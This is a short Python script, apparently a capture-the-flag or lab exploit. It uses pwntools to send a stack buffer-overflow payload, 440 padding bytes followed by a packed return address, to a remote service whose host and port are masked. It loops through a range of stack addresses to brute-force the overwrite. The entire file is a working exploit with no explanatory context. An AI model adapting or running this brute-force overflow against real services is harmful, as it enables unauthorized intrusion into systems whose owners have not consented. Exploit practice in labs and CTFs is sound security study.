from pwn import *
from struct import pack

end_addr = 0x0804ffff
start_addr = 0x08046b8c

while start_addr < end_addr:
    p = "A"*440
    p += pack('<L', start_addr)
    p += "\x0d"
    print("Using address %s" % hex(start_addr))
    print(len(p))
    r = remote("XXXXXXXX", 00000)
    print(r.recv(2048))
    r.send(p)
    print(r.recv(2048))
    start_addr += 1
    sleep(0.02)
    r.close()
